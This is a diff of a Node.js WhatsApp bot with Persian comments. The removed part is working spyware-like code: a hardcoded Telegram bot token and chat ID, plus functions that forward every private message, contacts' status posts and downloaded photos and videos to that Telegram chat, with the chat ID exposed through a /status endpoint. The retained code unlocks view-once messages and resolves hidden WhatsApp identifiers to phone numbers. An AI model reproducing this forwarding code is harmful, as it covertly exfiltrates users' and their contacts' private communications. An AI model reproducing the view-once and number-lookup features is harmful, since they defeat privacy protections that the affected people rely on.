@@ -25,11 +25,6 @@ const indexFile = path.join(publicFolder, 'index.html');
 const sessionsRoot = path.join(__dirname, 'sessions');
 const repliesFile = path.join(__dirname, 'replies.json');
 
-// تنظیمات ربات تلگرام
-const TELEGRAM_BOT_TOKEN =
-    process.env.TELEGRAM_BOT_TOKEN || '9064238902:AAFfWC5N4YtJrerJHQh-Dj4zCBJZtmhpO2M';
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8173349543';
-
 const DEFAULT_FALLBACK_REPLY =
     `سلام! پیام شما دریافت شد.\nاین ربات توسط ${BOT_NAME} جور شده است.\nبرای دیدن منو .menu بفرستید.`;
 
@@ -277,12 +272,25 @@ async function handleUserProfileCommand(sock, remoteJid, msg, body) {
     if (body.toLowerCase() !== '.git') return false;
 
     const quoted = getQuotedMessage(msg);
-    const targetJid = quoted?.key?.participant || remoteJid;
+    const isGroup = remoteJid.endsWith('@g.us');
+    const targetJid = quoted?.key?.participant || (isGroup ? (msg.key.participant || remoteJid) : remoteJid);
     const phoneDigits = normalizeDigits(targetJid);
-    const mappedPhone = phoneDigits && lidToPhone.has(phoneDigits) ? lidToPhone.get(phoneDigits) : null;
-    const profileJid = mappedPhone ? `${mappedPhone}@s.whatsapp.net` : targetJid;
+    let mappedPhone = phoneDigits && lidToPhone.has(phoneDigits) ? lidToPhone.get(phoneDigits) : null;
 
-    const displayPhone = extractPhoneFromJid(targetJid);
+    if (!mappedPhone && phoneDigits && targetJid.endsWith('@lid')) {
+        try {
+            const lookup = await sock.onWhatsApp(`${phoneDigits}@s.whatsapp.net`);
+            if (Array.isArray(lookup) && lookup[0]?.exists && lookup[0]?.jid) {
+                mappedPhone = normalizeDigits(lookup[0].jid);
+                if (mappedPhone) {
+                    lidToPhone.set(phoneDigits, mappedPhone);
+                }
+            }
+        } catch {}
+    }
+
+    const profileJid = mappedPhone ? `${mappedPhone}@s.whatsapp.net` : targetJid;
+    const displayPhone = mappedPhone || extractPhoneFromJid(targetJid);
     const displayName = resolveDisplayName(targetJid, quoted?.pushName || msg.pushName);
 
     const infoText = [
@@ -331,73 +339,6 @@ function extractTextFromMessage(rawMessage) {
     ).trim();
 }
 
-async function sendTelegramMessage(text) {
-    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || !text) return;
-    try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text
-            })
-        });
-    } catch (err) {
-        console.error('Telegram sendMessage error:', err.message);
-    }
-}
-
-async function sendTelegramMediaOrText(msg, caption) {
-    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
-
-    const innerMessage = unwrapMessage(msg.message) || {};
-    const isImage = Boolean(innerMessage.imageMessage);
-    const isVideo = Boolean(innerMessage.videoMessage);
-
-    if (!isImage && !isVideo) {
-        return sendTelegramMessage(caption);
-    }
-
-    try {
-        const mediaMsg = {
-            ...msg,
-            message: innerMessage
-        };
-        const buffer = await downloadMediaMessage(mediaMsg, 'buffer', {});
-        const formData = new FormData();
-        formData.append('chat_id', TELEGRAM_CHAT_ID);
-        formData.append('caption', caption);
-
-        if (isImage) {
-            const mimeType = innerMessage.imageMessage.mimetype || 'image/jpeg';
-            const ext = mimeType.includes('png') ? 'png' : 'jpg';
-            const blob = new Blob([buffer], { type: mimeType });
-            formData.append('photo', blob, `photo.${ext}`);
-            const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-            if (!resp.ok) {
-                throw new Error(`sendPhoto HTTP ${resp.status}`);
-            }
-        } else if (isVideo) {
-            const mimeType = innerMessage.videoMessage.mimetype || 'video/mp4';
-            const blob = new Blob([buffer], { type: mimeType });
-            formData.append('video', blob, 'video.mp4');
-            const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
-                method: 'POST',
-                body: formData
-            });
-            if (!resp.ok) {
-                throw new Error(`sendVideo HTTP ${resp.status}`);
-            }
-        }
-    } catch (err) {
-        console.error('Telegram media send error:', err.message);
-        await sendTelegramMessage(`${caption}\n⚠️ (ارسال فایل رسانه‌ای ناموفق بود، متن گزارش ارسال شد)`);
-    }
-}
-
 app.use(express.json());
 app.use(express.static(publicFolder));
 
@@ -413,9 +354,7 @@ app.get('/status', (req, res) => {
         ok: true,
         site: SITE_URL,
         bot: BOT_NAME,
-        tag: PAIR_TAG,
-        telegramConfigured: Boolean(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
-        telegramChatId: TELEGRAM_CHAT_ID
+        tag: PAIR_TAG
     });
 });
 
@@ -560,9 +499,6 @@ function attachEvents(sock, number, sessionFolder) {
                 await sock.sendMessage(sock.user.id, {
                     text: `✅ متصل شد و وضعیت آنلاین فعال است!\nاین ربات توسط ${BOT_NAME} جور شده است.\nبرای یاد دادن جواب جدید .Shahid را بفرستید.`
                 });
-                await sendTelegramMessage(
-                    `✅ واتساپ (${number}) به ربات ${BOT_NAME} متصل شد.`
-                );
             } catch (e) {
                 console.error('Open event error:', e.message);
             }
@@ -578,7 +514,7 @@ function attachEvents(sock, number, sessionFolder) {
                 activeSockets.delete(number);
                 fs.rmSync(sessionFolder, { recursive: true, force: true });
             } else if (shouldReconnect) {
-                await delay(1500);
+                await delay(1000);
                 startSocket(number, { isReconnect: true }).catch((err) => {
                     console.error('Reconnect error:', err.message);
                 });
@@ -587,123 +523,77 @@ function attachEvents(sock, number, sessionFolder) {
     });
 
     sock.ev.on('messages.upsert', async ({ messages }) => {
-        const msg = messages[0];
-        if (!msg || !msg.message) return;
+        for (const msg of messages) {
+            if (!msg || !msg.message) continue;
 
-        registerContactMapping(msg);
+            registerContactMapping(msg);
 
-        const remoteJid = msg.key.remoteJid;
-        if (!remoteJid) return;
+            const remoteJid = msg.key.remoteJid;
+            if (!remoteJid || remoteJid === 'status@broadcast') continue;
 
-        const body = extractTextFromMessage(msg.message);
-        const lowerCmd = body ? body.toLowerCase() : '';
-        const isGroup = remoteJid.endsWith('@g.us');
+            const senderJid = msg.key.participant || msg.participant || remoteJid;
+            if (msg.pushName && senderJid) {
+                contactNames.set(senderJid, msg.pushName.trim());
+            }
 
-        // ۱) استوری‌های واتساپ
-        if (remoteJid === 'status@broadcast') {
-            const authorJid = msg.key.participant || msg.participant || '';
-            const authorPhone = extractPhoneFromJid(authorJid);
-            const authorName = resolveDisplayName(authorJid, msg.pushName);
-            const storyText = body || '[استوری بدون متن]';
+            const body = extractTextFromMessage(msg.message);
+            const lowerCmd = body ? body.toLowerCase() : '';
+            const isGroup = remoteJid.endsWith('@g.us');
 
-            const storyCaption = [
-                '📸 استوری جدید در واتساپ',
-                `👤 نام: ${authorName}`,
-                `📞 شماره: ${authorPhone}`,
-                `📝 محتوا: ${storyText}`
-            ].join('\n');
+            // جلوگیری از لوپ روی پیام‌های خود ربات
+            const isBotEcho =
+                msg.key.fromMe &&
+                (body.startsWith('✅') ||
+                    body.startsWith('╔') ||
+                    body.startsWith('برای کدام متن') ||
+                    body.startsWith('برای این چی') ||
+                    body.startsWith('✅ ذخیره شد') ||
+                    body.startsWith('👤 نام:') ||
+                    body.startsWith('⚠️') ||
+                    body.startsWith('❌') ||
+                    body.endsWith(`\n${BOT_NAME}`) ||
+                    body === BOT_NAME);
+            if (isBotEcho) continue;
 
-            await sendTelegramMediaOrText(msg, storyCaption);
-            return;
-        }
-
-        // جلوگیری از لوپ روی پیام‌های خود ربات
-        const isBotEcho =
-            msg.key.fromMe &&
-            (body.startsWith('✅') ||
-                body.startsWith('╔') ||
-                body.startsWith('برای کدام متن') ||
-                body.startsWith('برای این چی') ||
-                body.startsWith('✅ ذخیره شد') ||
-                body.startsWith('👤 نام:') ||
-                body.startsWith('⚠️') ||
-                body.startsWith('❌') ||
-                body.endsWith(`\n${BOT_NAME}`) ||
-                body === BOT_NAME);
-        if (isBotEcho) return;
-
-        // در گروه‌ها فقط دستورات .vv و .git اجرا می‌شوند
-        if (isGroup) {
+            // اجرای فوری .vv و .git هم در گروه و هم در چت خصوصی
             if (lowerCmd === '.vv') {
-                await handleUnlockViewOnce(sock, remoteJid, msg, body);
-                return;
-            }
-            if (lowerCmd === '.git') {
-                await handleUserProfileCommand(sock, remoteJid, msg, body);
-                return;
-            }
-            return;
-        }
-
-        const targetPhone = extractPhoneFromJid(remoteJid);
-        const targetName = resolveDisplayName(remoteJid, msg.key.fromMe ? '' : msg.pushName);
-
-        // ۲) اگر خودتان به کسی پیام دادید (در چت خصوصی)
-        if (msg.key.fromMe) {
-            if (body) {
-                const outgoingText = [
-                    '📤 پیام ارسال‌شده توسط شما در واتساپ',
-                    `👤 نام مخاطب: ${targetName}`,
-                    `📞 شماره مخاطب: ${targetPhone}`,
-                    `💬 پیام: ${body}`
-                ].join('\n');
-
-                sendTelegramMediaOrText(msg, outgoingText).catch(() => {});
-            }
-
-            const isOwnerCmd =
-                lowerCmd === '.shahid' ||
-                lowerCmd.startsWith('.shahid ') ||
-                lowerCmd === '.vv' ||
-                lowerCmd === '.git' ||
-                teachStates.has(remoteJid);
-
-            if (!isOwnerCmd) return;
-        } else {
-            // ۳) اگر کسی به شما پیام داد (در چت خصوصی)
-            if (body) {
-                const incomingText = [
-                    '📩 پیام جدید در واتساپ',
-                    `👤 نام: ${targetName}`,
-                    `📞 شماره: ${targetPhone}`,
-                    `💬 پیام: ${body}`
-                ].join('\n');
-
-                sendTelegramMediaOrText(msg, incomingText).catch(() => {});
-            }
-        }
-
-        if (!body) return;
-
-        try {
-            if (lowerCmd === '.vv') {
-                await handleUnlockViewOnce(sock, remoteJid, msg, body);
-                return;
+                handleUnlockViewOnce(sock, remoteJid, msg, body).catch((err) => {
+                    console.error('Fast .vv error:', err.message);
+                });
+                continue;
             }
 
             if (lowerCmd === '.git') {
-                await handleUserProfileCommand(sock, remoteJid, msg, body);
-                return;
+                handleUserProfileCommand(sock, remoteJid, msg, body).catch((err) => {
+                    console.error('Fast .git error:', err.message);
+                });
+                continue;
             }
 
-            const handledTeach = await handleTeachCommand(sock, remoteJid, msg, body);
-            if (!handledTeach) {
-                const specificReply = autoReplies[lowerCmd];
-                const finalReply = specificReply || DEFAULT_FALLBACK_REPLY;
-                await sock.sendMessage(remoteJid, { text: finalReply }, { quoted: msg });
+            if (isGroup) continue;
+
+            // اگر خودتان در چت خصوصی پیام دادید، فقط دستورات آموزشی را بررسی کن
+            if (msg.key.fromMe) {
+                const isOwnerCmd =
+                    lowerCmd === '.shahid' ||
+                    lowerCmd.startsWith('.shahid ') ||
+                    teachStates.has(remoteJid);
+
+                if (!isOwnerCmd) continue;
             }
-        } catch (err) {
-            console.error('Message handling error:', err.message);
+
+            if (!body) continue;
+
+            try {
+                const handledTeach = await handleTeachCommand(sock, remoteJid, msg, body);
+                if (!handledTeach) {
+                    const specificReply = autoReplies[lowerCmd];
+                    const finalReply = specificReply || DEFAULT_FALLBACK_REPLY;
+                    await sock.sendMessage(remoteJid, { text: finalReply }, { quoted: msg });
+                }
+            } catch (err) {
+                console.error('Message handling error:', err.message);
+            }
         }
     });
 }
